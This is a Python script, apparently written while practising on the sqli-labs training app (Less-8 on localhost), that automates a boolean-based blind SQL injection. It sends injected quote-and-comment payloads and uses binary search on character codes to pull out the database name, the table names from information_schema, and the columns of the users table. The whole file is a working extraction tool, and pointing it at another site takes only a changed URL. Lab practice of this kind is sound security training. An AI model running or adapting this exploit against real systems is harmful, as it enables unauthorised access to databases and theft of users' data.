import requests

requests.adapters.DEFAULT_RETRIES = 5
connect = requests.session()
connect.keep_alive = False
flag = "You are in..........."


def getDBName(url):
    print("开始获取数据库长度...")
    length = 0
    # 二分法判断数据库长度
    left = 1
    right = 20
    while left <= right:
        mid = (left + right) // 2
        payload = f"' and length(database())={mid} --+"
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            length = mid
            print(f"数据库长度为{length}")
            break
        payload = f"' and length(database())>{mid} --+"
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            left = mid + 1
        else:
            right = mid - 1
    print("开始获取数据库名...")
    dbname = ""
    # 二分法获取数据库名称
    for i in range(1, length + 1):
        left = 32
        right = 126
        while left <= right:
            mid = (left + right) // 2
            payload = f"' and ascii(substr(database(),{i},1))={mid} --+"
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                dbname += chr(mid)
                print(dbname)
                break
            payload = f"' and ascii(substr(database(),{i},1))>{mid} --+"
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                left = mid + 1
            else:
                right = mid - 1
    print(f"数据库名称为{dbname}")
    return dbname


def getTables(url, dbname):
    print("开始获取所有表的长度...")
    length = 0
    left = 1
    right = 100
    while right >= left:
        mid = (left + right) // 2
        payload = (f"' and length((select group_concat(table_name) from information_schema.tables "
                   f"where table_schema='{dbname}'))={mid} --+")
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            length = mid
            print(f"所有表的长度为{length}")
            break
        payload = (f"' and length((select group_concat(table_name) from information_schema.tables "
                   f"where table_schema='{dbname}'))>{mid} --+")
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            left = mid + 1
        else:
            right = mid - 1
    print("开始获取所有表的名称...")
    tables = ""
    for i in range(1, length + 1):
        left = 32
        right = 126
        while left <= right:
            mid = (left + right) // 2
            payload = (f"' and ascii(substr((select group_concat(table_name) from information_schema.tables where "
                       f"table_schema='{dbname}'),{i},1))={mid} --+")
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                tables += chr(mid)
                print(tables)
                break
            payload = (f"' and ascii(substr((select group_concat(table_name) from information_schema.tables where "
                       f"table_schema='{dbname}'),{i},1))>{mid} --+")
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                left = mid + 1
            else:
                right = mid - 1
    print(f"所有表的名称为{tables}")
    return tables


def getColumns(url,tableName):
    print("开始获取所有列的长度...")
    length = 0
    left = 1
    right = 100
    while right >= left:
        mid = (left + right) // 2
        payload = (f"' and length((select group_concat(column_name) from information_schema.columns "
                   f"where table_name='{tableName}'))={mid} --+")
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            length = mid
            print(f"所有列的长度为{length}")
            break
        payload = (f"' and length((select group_concat(column_name) from information_schema.columns "
                   f"where table_name='{tableName}'))>{mid} --+")
        res = connect.get(url + payload)
        if flag in res.content.decode("utf-8"):
            left = mid + 1
        else:
            right = mid - 1
    print("开始获取所有列的名称...")
    columns = ""
    for i in range(1, length + 1):
        left = 32
        right = 126
        while left <= right:
            mid = (left + right) // 2
            payload = (f"' and ascii(substr((select group_concat(column_name) from information_schema.columns where "
                       f"table_name='{tableName}'),{i},1))={mid} --+")
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                columns += chr(mid)
                print(columns)
                break
            payload = (f"' and ascii(substr((select group_concat(column_name) from information_schema.columns where "
                       f"table_name='{tableName}'),{i},1))>{mid} --+")
            res = connect.get(url + payload)
            if flag in res.content.decode("utf-8"):
                left = mid + 1
            else:
                right = mid - 1
    print(f"所有表的名称为{columns}")
    return columns


def main():
    # url格式如下：http://localhost/sqli-labs-master/Less-8/?id=1
    url = "http://localhost/sqli-labs-master/Less-8/?id=1"
    # dbname = getDBName(url)
    # getTables(url, dbname)
    getColumns(url, "users")


if __name__ == "__main__":
    main()
